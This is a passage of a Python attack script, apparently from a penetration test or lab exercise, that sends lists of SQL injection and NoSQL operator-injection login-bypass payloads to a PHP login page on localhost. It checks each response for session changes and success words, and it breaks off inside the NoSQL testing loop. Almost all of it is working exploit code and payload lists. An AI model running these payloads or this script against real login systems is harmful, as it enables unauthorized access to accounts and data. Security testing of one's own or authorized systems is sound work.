import requests
import json
import urllib.parse

# Base URL and endpoint from context
base_url = "http://127.0.0.1:8080"
login_endpoint = "/login.php"

# Session from previous authentication
cookies = {
    "PHPSESSID": "adf118a2717e83ee6455ea878ebb507e"
}

# Headers for different content types
headers_form = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

headers_json = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json"
}

# === SQL INJECTION PAYLOADS ===
sqli_payloads = [
    # Basic auth bypass
    {"username": "' OR '1'='1", "password": "' OR '1'='1"},
    {"username": "admin'--", "password": ""},
    {"username": "' OR 1=1--", "password": ""},
    {"username": "' OR 1=1 #", "password": ""},
    {"username": "' OR '1'='1' --", "password": ""},
    {"username": "' OR '' = '", "password": ""},
    {"username": "'=''", "password": "'=''"},
    
    # UNION-based (assuming 2 columns for username/password)
    {"username": "' UNION SELECT 'admin','admin' --", "password": ""},
    {"username": "' UNION SELECT 'admin','admin' #", "password": ""},
    
    # Encoded variations
    {"username": "%27+OR+%271%27%3D%271", "password": "%27+OR+%271%27%3D%271"},
    {"username": "admin%27--", "password": ""},
    {"username": "%2527+OR+1%253D1--", "password": ""},  # Double URL encoded
    
    # Case variations
    {"username": "' OR '1'='1", "password": "' Or '1'='1"},
    {"username": "' Or '1'='1", "password": "' oR '1'='1"},
]

# === NOSQL INJECTION PAYLOADS ===
nosql_payloads = [
    # URL-encoded form data format
    {"username[$ne]": "invalid", "password[$ne]": "invalid"},
    {"username[$gt]": "", "password[$gt]": ""},
    {"username[$regex]": ".*", "password[$ne]": ""},
    {"username[$nin][]": "admin", "login[$nin][]": "user", "password[$ne]": "x"},
    
    # Specific user targeting
    {"username": "admin", "password[$ne]": ""},
    {"username[$in][]": "admin", "username[$in][]": "root", "password[$gt]": ""},
]

# Test results storage
results = []

print("="*60)
print("SQL INJECTION TESTING - login.php")
print("="*60)

# Test SQLi payloads with form encoding
for i, payload in enumerate(sqli_payloads):
    try:
        # URL encode the payload
        encoded_payload = urllib.parse.urlencode(payload)
        
        response = requests.post(
            f"{base_url}{login_endpoint}",
            data=encoded_payload,
            headers=headers_form,
            cookies=cookies,
            allow_redirects=False,
            timeout=10
        )
        
        # Check for indicators
        indicators = {
            "status_code": response.status_code,
            "content_length": len(response.content),
            "has_session_change": "PHPSESSID" in response.cookies and response.cookies["PHPSESSID"] != cookies["PHPSESSID"],
            "has_success": "connected" in response.text.lower() or "success" in response.text.lower() or "welcome" in response.text.lower(),
            "has_error": "error" in response.text.lower() or "invalid" in response.text.lower() or "failed" in response.text.lower(),
            "has_admin": "admin" in response.text.lower(),
            "new_session": response.cookies.get("PHPSESSID", "")
        }
        
        results.append({
            "test_id": f"SQLi-{i+1}",
            "type": "SQLi",
            "payload": payload,
            "response": indicators,
            "full_response": response.text[:500] if len(response.text) > 500 else response.text
        })
        
        print(f"\n[SQLi-{i+1}] Payload: {payload}")
        print(f"Status: {indicators['status_code']} | Length: {indicators['content_length']}B")
        print(f"Success Indicator: {indicators['has_success']}")
        print(f"Session Changed: {indicators['has_session_change']}")
        
        # Print actual response for analysis
        if indicators['has_success']:
            print(f"[!] SUCCESS DETECTED!")
            print(f"Response: {indicators['full_response']}")
        
        if indicators['has_session_change']:
            print(f"[!] NEW SESSION: {indicators['new_session']}")
            
    except Exception as e:
        print(f"[SQLi-{i+1}] Error: {str(e)}")

print("\n" + "="*60)
print("NOSQL INJECTION TESTING - login.php")
print("="*60)

# Test NoSQL payloads with form encoding
for i, payload in enumerate(nosql_payloads):
